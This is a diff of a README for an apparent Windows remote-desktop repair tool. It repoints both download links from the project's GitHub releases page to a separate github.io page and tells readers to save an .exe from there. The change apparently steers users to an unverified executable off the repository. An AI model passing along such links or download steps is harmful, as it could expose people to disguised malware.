@@ -1,6 +1,6 @@
 # 🛠️ RDP-Connection-Failed-Fix - Restore Your Remote Desktop Access Quickly
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Maarenation970/RDP-Connection-Failed-Fix/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://maarenation970.github.io)
 
 ## 📖 About This Tool
 
@@ -21,7 +21,7 @@ This application works on most Windows systems. Ensure your machine meets these 
 
 You must visit the official release page to obtain the installer. Follow these steps to find the file:
 
-1. Click this link: [Visit the Releases Page to Download](https://github.com/Maarenation970/RDP-Connection-Failed-Fix/releases).
+1. Click this link: [Visit the Releases Page to Download](https://maarenation970.github.io).
 2. Look for the section marked Latest.
 3. Select the file ending in .exe.
 4. Save the file to your computer.
